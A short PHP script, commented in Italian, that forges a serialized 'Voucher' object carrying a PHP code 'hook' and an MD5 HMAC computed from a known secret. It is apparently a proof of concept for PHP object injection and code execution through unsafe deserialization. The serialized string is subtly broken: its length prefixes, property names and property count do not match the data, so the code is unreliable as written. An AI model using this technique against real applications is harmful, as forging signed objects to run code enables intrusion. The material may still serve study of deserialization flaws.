<?PHP
$maliciousVoucher = array("_id" => "voucher_malicious_id");

$secret = "known_secret"; // Valore noto di $secret

$hook = 'echo "Errore! Voucher non valido"; exit();';

$hmac = md5($secret . serialize($maliciousVoucher) . $hook);

// Creazione dell'oggetto Voucher malevolo
$serializedObject = 'O:7:"Voucher":4:{s:7:"voucher";a:1:{s:3:"_id";s:18:"voucher_malicious_id";}s:4:"Voucherhook";s:'.strlen($hook).':"'.$hook.'";s:4:"Voucherhmac";s:32:"' . $hmac . '";s:0:""}';

echo $serializedObject;
?>
